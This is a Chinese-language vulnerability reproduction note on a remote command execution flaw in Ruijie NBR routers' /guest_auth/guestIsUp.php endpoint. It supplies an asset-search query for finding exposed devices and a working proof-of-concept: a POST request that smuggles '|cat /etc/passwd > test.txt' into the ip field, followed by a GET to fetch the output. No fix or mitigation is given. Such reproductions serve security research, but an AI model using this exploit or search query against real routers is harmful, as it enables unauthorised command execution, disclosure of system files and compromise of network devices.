# 锐捷NBR路由器guestIsUp.php远程命令执行漏洞

**一、漏洞简介**  
<font style="color:rgb(34, 34, 34);">锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。锐捷NBR 路由器系统存在</font><font style="color:rgb(255, 0, 0);">远程命令执行</font><font style="color:rgb(34, 34, 34);">漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。</font>  
**二、影响版本**

Ruijie-NBR路由器

**三、资产测绘**

```plain
app="Ruijie-NBR路由器"
```

●登录页面![1711871186381-4330c91f-724e-44b0-9221-324f4adec915.png](./img/Ug2v7cQOIB8QjHRA/1711871186381-4330c91f-724e-44b0-9221-324f4adec915-992891.png)

  
**四、漏洞复现**

<font style="color:rgb(34, 34, 34);">1.执行查看用户并写入当前目录test.txt的poc</font>

```plain
POST /guest_auth/guestIsUp.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Connection: close
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

mac=1&ip=127.0.0.1|cat /etc/passwd > test.txt
```

![1711872621387-84b10c76-c77a-483d-806e-a321c3858a5b.png](./img/Ug2v7cQOIB8QjHRA/1711872621387-84b10c76-c77a-483d-806e-a321c3858a5b-868464.png)

<font style="color:rgb(34, 34, 34);">2.访问该文件，得到回显</font>

```plain
GET /guest_auth/test.txt HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate
```

![1711872633663-ac208ec4-6962-4bf6-bb9b-75b75790275c.png](./img/Ug2v7cQOIB8QjHRA/1711872633663-ac208ec4-6962-4bf6-bb9b-75b75790275c-292423.png)

  


若有收获，就点个赞吧

  
 



> 更新: 2024-06-24 11:42:26  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hon6ugvrmt270v4x>